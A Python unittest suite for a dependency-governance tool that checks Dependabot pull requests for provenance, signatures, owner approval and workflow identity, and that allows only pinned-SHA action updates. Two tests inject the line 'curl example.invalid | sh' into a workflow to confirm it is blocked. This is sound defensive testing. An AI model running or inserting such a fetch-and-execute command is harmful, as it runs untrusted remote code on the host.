from __future__ import annotations

import json
import unittest
from datetime import datetime, timezone
from pathlib import Path

from dependency_governance import (
    ACTION_LINE,
    Assessment,
    GovernanceError,
    classify_ecosystem,
    compare_versions,
    dispatch_and_wait_for_main_requalification,
    ensure_owner_review_and_approval,
    event_pull_number,
    has_exact_owner_approval,
    parse_dependabot_metadata,
    parse_positive_integer,
    reconcile_independently,
    render_comment,
    request_dependabot_refresh,
    request_exact_head_qualification_dispatches,
    select_qualification_run,
    trusted_dispatch_identity_matches,
    validate_actions_semantic_change,
    validate_config,
    validate_npm_manual,
    validate_provenance,
    validate_signed_metadata,
    workflow_identity_matches,
)

ROOT = Path(__file__).resolve().parents[2]
CONFIG = json.loads(
    (ROOT / ".github" / "dependency-governance.json").read_text(encoding="utf-8")
)


def canonical_fixture() -> tuple[str, str, dict, dict]:
    base_sha = "a" * 40
    head_sha = "b" * 40
    pull = {
        "number": 54,
        "state": "open",
        "draft": False,
        "created_at": "2026-09-01T12:00:00Z",
        "commits": 1,
        "changed_files": 1,
        "labels": [],
        "user": {"login": CONFIG["botLogin"], "id": CONFIG["botUserId"]},
        "base": {
            "ref": CONFIG["baseBranch"],
            "sha": base_sha,
            "repo": {"full_name": "o/r"},
        },
        "head": {
            "ref": "dependabot/github_actions/routine-actions",
            "sha": head_sha,
            "repo": {"full_name": "o/r"},
        },
    }
    commit = {
        "sha": head_sha,
        "author": {"login": CONFIG["botLogin"], "id": CONFIG["botUserId"]},
        "committer": {"login": CONFIG["trustedCommitterLogin"]},
        "commit": {
            "author": {
                "name": CONFIG["botLogin"],
                "email": CONFIG["botAuthorEmail"],
            },
            "committer": {
                "name": CONFIG["gitCommitterName"],
                "email": CONFIG["gitCommitterEmail"],
            },
            "verification": {
                "verified": True,
                "reason": "valid",
                "signature": "fixture-signature",
            },
            "message": (
                "deps(deps): bump actions/checkout\n\n---\nupdated-dependencies:\n"
                "- dependency-name: actions/checkout\n"
                "  dependency-version: '7.0.2'\n"
                "  dependency-type: direct:production\n"
                "  update-type: version-update:semver-patch\n"
                "...\n\n"
                + CONFIG["signedOffBy"]
            ),
        },
        "parents": [{"sha": base_sha}],
    }
    return base_sha, head_sha, pull, commit


class OwnerApi:
    def __init__(
        self,
        login: str = CONFIG["ownerApprovalLogin"],
        user_id: int = CONFIG["ownerApprovalUserId"],
    ) -> None:
        self.identity = {"login": login, "id": user_id}
        self.comments: list[dict] = []
        self.reviews: list[dict] = []

    def get(self, path: str) -> dict:
        if path == "https://api.github.com/user":
            return dict(self.identity)
        raise AssertionError(path)

    def paginate(self, path: str, selector: str | None = None) -> list[dict]:
        if path.endswith("/comments"):
            return list(self.comments)
        if path.endswith("/reviews"):
            return list(self.reviews)
        raise AssertionError(path)

    def post(self, path: str, payload: dict) -> dict:
        if path.endswith("/comments"):
            item = {
                "id": len(self.comments) + 1,
                "body": payload["body"],
                "user": dict(self.identity),
            }
            self.comments.append(item)
            return item
        if path.endswith("/reviews"):
            item = {
                "id": len(self.reviews) + 1,
                "body": payload["body"],
                "user": dict(self.identity),
                "state": "APPROVED",
                "commit_id": payload["commit_id"],
            }
            self.reviews.append(item)
            return item
        raise AssertionError(path)


class DependencyGovernanceTests(unittest.TestCase):
    def test_config_is_fail_closed(self) -> None:
        self.assertEqual(validate_config(CONFIG), [])
        major = {
            **CONFIG,
            "allowedActionUpdateTypes": [
                *CONFIG["allowedActionUpdateTypes"],
                "version-update:semver-major",
            ],
        }
        self.assertTrue(validate_config(major))
        self.assertTrue(validate_config({**CONFIG, "manualReviewPaths": []}))
        self.assertTrue(validate_config({**CONFIG, "ownerApprovalRequired": False}))
        self.assertTrue(validate_config({**CONFIG, "ownerApprovalUserId": 0}))
        self.assertTrue(
            validate_config({**CONFIG, "trustedWorkflowDispatchActorLogin": "someone"})
        )
        for protected in (
            ".github/security/npm-audit-exceptions.json",
            ".github/scripts/validate_npm_audit.js",
            ".github/scripts/test_npm_audit_validator.js",
        ):
            narrowed = {
                **CONFIG,
                "manualReviewPaths": [
                    item for item in CONFIG["manualReviewPaths"] if item != protected
                ],
            }
            self.assertTrue(validate_config(narrowed), protected)

    def test_owner_review_approval_and_stale_refresh_are_exact_head_bound(self) -> None:
        base, head, pull, commit = canonical_fixture()
        assessment = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": ".github/workflows/security.yml"}],
            ecosystem="github-actions",
            provenance={"eligible": True, "reasons": [], "commit": commit},
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic={"eligible": True, "reasons": [], "changes": []},
            qualification={"allSuccess": True, "anyFailed": False, "qualifications": []},
        )
        owner = OwnerApi()
        ensure_owner_review_and_approval(owner, assessment, CONFIG)
        self.assertEqual(len(owner.comments), 1)
        self.assertEqual(len(owner.reviews), 1)
        self.assertTrue(has_exact_owner_approval(owner, pull["number"], head, CONFIG))
        ensure_owner_review_and_approval(owner, assessment, CONFIG)
        self.assertEqual(len(owner.comments), 1)
        self.assertEqual(len(owner.reviews), 1)

        stale = Assessment(
            pull=pull,
            base_sha="c" * 40,
            files=assessment.files,
            ecosystem=assessment.ecosystem,
            provenance={
                "eligible": False,
                "reasons": ["PR is not rebased directly on the current base branch head"],
                "commit": commit,
            },
            metadata=assessment.metadata,
            semantic={"eligible": False, "reasons": [], "changes": []},
            qualification={"allSuccess": False, "anyFailed": False, "qualifications": []},
        )
        refresh_owner = OwnerApi()
        self.assertTrue(request_dependabot_refresh(refresh_owner, stale, CONFIG))
        self.assertIn("@dependabot rebase", refresh_owner.comments[0]["body"])
        self.assertIn(head, refresh_owner.comments[0]["body"])
        self.assertTrue(request_dependabot_refresh(refresh_owner, stale, CONFIG))
        self.assertEqual(len(refresh_owner.comments), 1)

    def test_action_required_runs_dispatch_trusted_exact_head_workflows(self) -> None:
        base, head, pull, commit = canonical_fixture()
        assessment = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": ".github/workflows/security.yml"}],
            ecosystem="github-actions",
            provenance={"eligible": True, "reasons": [], "commit": commit},
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic={"eligible": True, "reasons": [], "changes": []},
            qualification={"allSuccess": False, "anyFailed": True, "qualifications": []},
        )

        class QualificationApi:
            def __init__(self) -> None:
                self.posts: list[tuple[str, dict]] = []
                self.runs: list[dict] = []
                for index, requirement in enumerate(CONFIG["requiredWorkflows"], start=1):
                    self.runs.append(
                        {
                            "id": index,
                            "name": requirement["workflow"],
                            "path": f".github/workflows/{requirement['file']}",
                            "event": "pull_request",
                            "head_sha": head,
                            "head_branch": pull["head"]["ref"],
                            "pull_requests": [{"number": pull["number"]}],
                            "status": "completed",
                            "conclusion": "action_required",
                            "updated_at": f"2026-09-02T10:00:0{index}Z",
                        }
                    )

            def get(self, path: str) -> dict:
                if path.startswith("/git/ref/heads/"):
                    return {"object": {"sha": head}}
                raise AssertionError(path)

            def paginate(self, path: str, selector: str | None = None) -> list[dict]:
                if path.startswith("/actions/runs?"):
                    return list(self.runs)
                raise AssertionError(path)

            def post(self, path: str, payload: dict) -> dict:
                self.posts.append((path, payload))
                return {}

        api = QualificationApi()
        outcomes = request_exact_head_qualification_dispatches(api, assessment, CONFIG)
        self.assertEqual(len(api.posts), len(CONFIG["requiredWorkflows"]))
        self.assertTrue(all(item["state"] == "requested" for item in outcomes))
        self.assertTrue(all(payload == {"ref": pull["head"]["ref"]} for _, payload in api.posts))

        requirement = CONFIG["requiredWorkflows"][0]
        trusted = {
            "id": 99,
            "name": requirement["workflow"],
            "path": f".github/workflows/{requirement['file']}",
            "event": "workflow_dispatch",
            "head_sha": head,
            "head_branch": pull["head"]["ref"],
            "actor": {
                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
            },
            "triggering_actor": {
                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
            },
            "status": "queued",
            "conclusion": None,
            "updated_at": "2026-09-02T11:00:00Z",
        }
        self.assertTrue(trusted_dispatch_identity_matches(trusted, pull, requirement, CONFIG))
        self.assertEqual(
            select_qualification_run([api.runs[0], trusted], pull, requirement, CONFIG)["id"],
            99,
        )
        spoofed = {**trusted, "triggering_actor": {"login": "someone", "id": 1}}
        self.assertFalse(
            trusted_dispatch_identity_matches(spoofed, pull, requirement, CONFIG)
        )

    def test_post_merge_requalification_requires_exact_trusted_main_gate_success(self) -> None:
        merge_sha = "d" * 40

        class MainApi:
            def __init__(self) -> None:
                self.posts: list[tuple[str, dict]] = []
                self.runs: list[dict] = []
                self.jobs: dict[int, list[dict]] = {}
                for index, requirement in enumerate(CONFIG["requiredWorkflows"], start=100):
                    self.runs.append(
                        {
                            "id": index,
                            "name": requirement["workflow"],
                            "path": f".github/workflows/{requirement['file']}",
                            "event": "workflow_dispatch",
                            "head_sha": merge_sha,
                            "head_branch": CONFIG["baseBranch"],
                            "actor": {
                                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
                            },
                            "triggering_actor": {
                                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
                            },
                            "status": "completed",
                            "conclusion": "success",
                            "updated_at": f"2026-09-02T12:00:{index - 100:02d}Z",
                        }
                    )
                    self.jobs[index] = [
                        {
                            "name": requirement["gate"],
                            "status": "completed",
                            "conclusion": "success",
                        }
                    ]

            def get(self, path: str) -> dict:
                if path == f"/git/ref/heads/{CONFIG['baseBranch']}":
                    return {"object": {"sha": merge_sha}}
                raise AssertionError(path)

            def post(self, path: str, payload: dict) -> dict:
                self.posts.append((path, payload))
                return {}

            def paginate(self, path: str, selector: str | None = None) -> list[dict]:
                if path.startswith("/actions/runs?"):
                    return list(self.runs)
                import re as _re
                match = _re.fullmatch(r"/actions/runs/(\d+)/jobs", path)
                if match:
                    return list(self.jobs[int(match.group(1))])
                raise AssertionError(path)

        api = MainApi()
        result = dispatch_and_wait_for_main_requalification(
            api,
            merge_sha,
            CONFIG,
            sleep_fn=lambda _: None,
            poll_attempts=1,
            poll_interval_seconds=0,
        )
        self.assertEqual(len(api.posts), len(CONFIG["requiredWorkflows"]))
        self.assertTrue(all(item["state"] == "success" for item in result))

        failed_api = MainApi()
        failed_api.jobs[100][0]["conclusion"] = "failure"
        failed = dispatch_and_wait_for_main_requalification(
            failed_api,
            merge_sha,
            CONFIG,
            sleep_fn=lambda _: None,
            poll_attempts=1,
            poll_interval_seconds=0,
        )
        self.assertEqual(failed[0]["state"], "gate-failure")

        spoofed_api = MainApi()
        spoofed_api.runs[0]["triggering_actor"] = {"login": "someone", "id": 1}
        spoofed = dispatch_and_wait_for_main_requalification(
            spoofed_api,
            merge_sha,
            CONFIG,
            sleep_fn=lambda _: None,
            poll_attempts=1,
            poll_interval_seconds=0,
        )
        self.assertEqual(spoofed[0]["state"], "timeout-waiting-for-run")

    def test_positive_integer_parser(self) -> None:
        self.assertEqual(parse_positive_integer("54"), 54)
        for value in ("0", "-1", "1.5", "abc", "9007199254740992"):
            with self.assertRaises(GovernanceError):
                parse_positive_integer(value)

    def test_metadata_parser(self) -> None:
        _, _, _, commit = canonical_fixture()
        metadata = parse_dependabot_metadata(commit["commit"]["message"])
        self.assertEqual(metadata[0]["name"], "actions/checkout")
        self.assertEqual(metadata[0]["updateType"], "version-update:semver-patch")

    def test_signed_metadata_requires_dependency_records(self) -> None:
        _, _, _, commit = canonical_fixture()
        self.assertTrue(validate_signed_metadata(commit)["eligible"])
        self.assertFalse(
            validate_signed_metadata({"commit": {"message": CONFIG["signedOffBy"]}})[
                "eligible"
            ]
        )

    def test_provenance_accepts_only_canonical_untouched_dependabot_commit(self) -> None:
        base, _, pull, commit = canonical_fixture()
        result = validate_provenance(
            pull,
            [commit],
            base,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertTrue(result["eligible"], result["reasons"])

    def test_provenance_rejects_spoofed_bot_identity(self) -> None:
        base, _, pull, commit = canonical_fixture()
        commit = json.loads(json.dumps(commit))
        commit["author"]["id"] = 123
        commit["commit"]["author"]["email"] = "dependabot[bot]@example.invalid"
        result = validate_provenance(
            pull,
            [commit],
            base,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertFalse(result["eligible"])
        self.assertRegex("\n".join(result["reasons"]), r"numeric identity|author email")

    def test_provenance_rejects_non_github_materialization_and_invalid_signature(self) -> None:
        base, _, pull, commit = canonical_fixture()
        commit = json.loads(json.dumps(commit))
        commit["committer"]["login"] = "someone"
        commit["commit"]["verification"]["reason"] = "unknown_key"
        result = validate_provenance(
            pull,
            [commit],
            base,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertFalse(result["eligible"])
        self.assertRegex("\n".join(result["reasons"]), r"materialized|signature")

    def test_provenance_rejects_human_second_commit_and_stale_base(self) -> None:
        base, _, pull, commit = canonical_fixture()
        pull2 = json.loads(json.dumps(pull))
        pull2["commits"] = 2
        result = validate_provenance(
            pull2,
            [commit, {"sha": "c" * 40}],
            base,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertFalse(result["eligible"])
        stale = validate_provenance(
            pull,
            [commit],
            "d" * 40,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertFalse(stale["eligible"])

    def test_provenance_rejects_age_and_manual_review_label(self) -> None:
        base, _, pull, commit = canonical_fixture()
        old = json.loads(json.dumps(pull))
        old["created_at"] = "2026-08-01T12:00:00Z"
        labeled = json.loads(json.dumps(pull))
        labeled["labels"] = [{"name": "manual-review"}]
        now = datetime(2026, 9, 2, 12, tzinfo=timezone.utc)
        self.assertFalse(validate_provenance(old, [commit], base, CONFIG, now=now)["eligible"])
        self.assertFalse(
            validate_provenance(labeled, [commit], base, CONFIG, now=now)["eligible"]
        )

    def test_ecosystem_classification_is_exact(self) -> None:
        self.assertEqual(
            classify_ecosystem([{"filename": "package.json"}], CONFIG), "npm"
        )
        self.assertEqual(
            classify_ecosystem([{"filename": ".github/workflows/ci.yml"}], CONFIG),
            "github-actions",
        )
        self.assertEqual(
            classify_ecosystem(
                [{"filename": "package.json"}, {"filename": "README.md"}], CONFIG
            ),
            "unknown",
        )

    def test_npm_is_deliberately_manual_due_to_override_and_lock_security_scope(self) -> None:
        result = validate_npm_manual(CONFIG)
        self.assertFalse(result["eligible"])
        self.assertIn("explicit transitive security/compatibility overrides", result["reasons"][0])

    def test_zero_alert_security_files_remain_manual_control_plane(self) -> None:
        for path in (
            ".github/scripts/validate_codeql_sarif.py",
            ".github/scripts/validate_codeql_sarif_selfcheck.py",
            ".github/scripts/validate_security_stack.py",
        ):
            self.assertIn(path, CONFIG["manualReviewPaths"])

    def test_action_line_requires_immutable_sha_and_version_annotation(self) -> None:
        good = "      - uses: actions/checkout@" + "a" * 40 + " # v7.0.1"
        self.assertIsNotNone(ACTION_LINE.fullmatch(good))
        self.assertIsNone(ACTION_LINE.fullmatch("      - uses: actions/checkout@v7"))
        self.assertIsNone(ACTION_LINE.fullmatch("      - uses: ./local-action"))

    def test_actions_patch_update_is_eligible(self) -> None:
        file = ".github/workflows/ci.yml"
        before = "steps:\n  - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n"
        after = "steps:\n  - uses: actions/checkout@" + "b" * 40 + " # v7.0.2\n"
        metadata = [
            {
                "name": "actions/checkout",
                "version": "7.0.2",
                "updateType": "version-update:semver-patch",
            }
        ]
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
        )
        self.assertTrue(result["eligible"], result["reasons"])

    def test_actions_major_and_non_uses_mutation_are_blocked(self) -> None:
        file = ".github/workflows/ci.yml"
        before = (
            "steps:\n  - uses: actions/checkout@"
            + "a" * 40
            + " # v7.0.1\n  - run: echo safe\n"
        )
        major = (
            "steps:\n  - uses: actions/checkout@"
            + "b" * 40
            + " # v8.0.0\n  - run: echo safe\n"
        )
        metadata = [
            {
                "name": "actions/checkout",
                "version": "8.0.0",
                "updateType": "version-update:semver-major",
            }
        ]
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: major}, metadata, CONFIG
        )
        self.assertFalse(result["eligible"])
        mutated = major.replace("echo safe", "curl example.invalid | sh")
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: mutated}, metadata, CONFIG
        )
        self.assertFalse(result["eligible"])
        self.assertIn("outside an immutable uses reference", "\n".join(result["reasons"]))

    def test_protected_workflows_allow_only_proven_immutable_action_updates(self) -> None:
        for file in (
            ".github/workflows/security.yml",
            ".github/workflows/dependency-governance.yml",
        ):
            before = "steps:\n  - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n"
            after = "steps:\n  - uses: actions/checkout@" + "b" * 40 + " # v7.0.2\n"
            metadata = [
                {
                    "name": "actions/checkout",
                    "version": "7.0.2",
                    "updateType": "version-update:semver-patch",
                }
            ]
            result = validate_actions_semantic_change(
                [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
            )
            self.assertTrue(result["eligible"], result["reasons"])

            mutated = after + "  - run: curl example.invalid | sh\n"
            result = validate_actions_semantic_change(
                [{"filename": file}], {file: before}, {file: mutated}, metadata, CONFIG
            )
            self.assertFalse(result["eligible"])
            reasons = "\n".join(result["reasons"])
            self.assertTrue(
                "outside an immutable uses reference" in reasons
                or "changes line structure outside a uses reference" in reasons
            )

    def test_grouped_action_metadata_may_lag_exact_immutable_pin(self) -> None:
        file = ".github/workflows/security.yml"
        before = (
            "steps:\n"
            "  - name: Initialize CodeQL\n"
            "    uses: github/codeql-action/init@" + "a" * 40 + " # v4.38.0\n"
        )
        after = before.replace("a" * 40 + " # v4.38.0", "b" * 40 + " # v4.38.2")
        metadata = [
            {
                "name": "github/codeql-action/init",
                "version": "4.38.1",
                "updateType": "version-update:semver-patch",
            }
        ]
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
        )
        self.assertTrue(result["eligible"], result["reasons"])

    def test_version_comparison_treats_zero_minor_as_breaking_risk(self) -> None:
        self.assertEqual(compare_versions("7.0.1", "7.0.2"), "patch")
        self.assertEqual(compare_versions("7.0.1", "7.1.0"), "minor")
        self.assertEqual(compare_versions("7.0.1", "8.0.0"), "major")
        self.assertEqual(compare_versions("0.36.0", "0.37.0"), "major-risk")
        self.assertEqual(compare_versions("7.0.1", "6.9.9"), "downgrade")

    def test_workflow_identity_binds_name_path_event_head_branch_and_optional_pr(self) -> None:
        _, head, pull, _ = canonical_fixture()
        requirement = CONFIG["requiredWorkflows"][0]
        run = {
            "id": 1,
            "name": requirement["workflow"],
            "path": f".github/workflows/{requirement['file']}",
            "event": "pull_request",
            "head_sha": head,
            "head_branch": pull["head"]["ref"],
            "pull_requests": [],
            "updated_at": "2026-09-02T10:00:00Z",
        }
        self.assertTrue(workflow_identity_matches(run, pull, requirement))
        self.assertTrue(
            workflow_identity_matches(
                {**run, "pull_requests": [{"number": pull["number"]}]}, pull, requirement
            )
        )
        for mutation in (
            {"name": "fake"},
            {"path": ".github/workflows/fake.yml"},
            {"event": "push"},
            {"head_sha": "c" * 40},
            {"head_branch": "dependabot/other"},
            {"pull_requests": [{"number": 999}]},
        ):
            self.assertFalse(workflow_identity_matches({**run, **mutation}, pull, requirement))
        newer_wrong = {
            **run,
            "id": 2,
            "path": ".github/workflows/fake.yml",
            "updated_at": "2026-09-02T11:00:00Z",
        }
        self.assertEqual(select_qualification_run([newer_wrong, run], pull, requirement)["id"], 1)

    def test_manual_dispatch_input_is_strict(self) -> None:
        self.assertEqual(
            event_pull_number({"inputs": {"pr-number": "54"}}, "workflow_dispatch"), 54
        )
        for bad in ("0", "-1", "1.2", "nope"):
            with self.assertRaises(GovernanceError):
                event_pull_number({"inputs": {"pr-number": bad}}, "workflow_dispatch")

    def test_schedule_reconciliation_isolates_failures(self) -> None:
        pulls = [{"number": 1}, {"number": 2}, {"number": 3}]
        visited: list[int] = []

        def processor(pull: dict) -> str:
            visited.append(pull["number"])
            if pull["number"] == 2:
                raise RuntimeError("boom")
            return "ok"

        results, failures = reconcile_independently(pulls, processor)
        self.assertEqual(visited, [1, 2, 3])
        self.assertEqual([number for number, _ in results], [1, 3])
        self.assertEqual(failures, [(2, "boom")])

    def test_comment_documents_safety_boundary(self) -> None:
        base, _, pull, commit = canonical_fixture()
        assessment = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": "package.json"}],
            ecosystem="npm",
            provenance={"eligible": True, "reasons": [], "commit": commit},
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic=validate_npm_manual(CONFIG),
            qualification={
                "allSuccess": False,
                "anyFailed": False,
                "qualifications": [
                    {**item, "state": "not-evaluated", "runId": None}
                    for item in CONFIG["requiredWorkflows"]
                ],
            },
        )
        body = render_comment(assessment, CONFIG)
        self.assertIn("owner-authenticated approval", body)
        self.assertIn("requalified on its exact resulting main commit", body)
        self.assertIn("MANUAL / WAIT", body)

    def test_privileged_workflow_never_checks_out_dependabot_head(self) -> None:
        workflow = (
            ROOT / ".github" / "workflows" / "dependency-governance.yml"
        ).read_text(encoding="utf-8")
        self.assertIn("push:", workflow)
        self.assertIn("pull_request_target:", workflow)
        self.assertIn("workflow_run:", workflow)
        self.assertIn("schedule:", workflow)
        self.assertIn("ref: ${{ github.event.repository.default_branch }}", workflow)
        self.assertIn("persist-credentials: false", workflow)
        self.assertNotRegex(workflow, r"ref:\s*\$\{\{\s*github\.event\.pull_request\.head")
        self.assertNotRegex(workflow, r"ref:\s*\$\{\{\s*github\.event\.workflow_run\.head_sha")
        self.assertIn("|| 'reconcile'", workflow)
        self.assertIn("DEPENDABOT_OWNER_TOKEN", workflow)
        self.assertIn("timeout-minutes: 30", workflow)


if __name__ == "__main__":
    unittest.main(verbosity=2)
